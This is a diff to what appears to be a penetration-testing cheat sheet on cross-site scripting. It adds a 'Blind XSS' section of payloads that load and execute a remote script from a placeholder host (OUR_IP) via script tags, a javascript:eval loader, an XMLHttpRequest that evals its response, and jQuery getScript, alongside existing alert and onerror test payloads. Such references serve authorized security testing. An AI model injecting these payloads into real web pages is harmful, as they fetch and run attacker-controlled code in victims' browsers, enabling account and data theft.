@@ -84,6 +84,17 @@ Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-P
 <script>print()</script>
 ```
 
+#### Blind XSS
+This is where we cannot see the output of the XSS. We can often try including an external script to see if it works:
+```html
+<script src="http://OUR_IP"></script>
+'><script src="http://OUR_IP"></script>
+"><script src="http://OUR_IP"></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
 #### HTML Tags
 ```HTML
 <img/src=x a='' onerror=alert(1)>
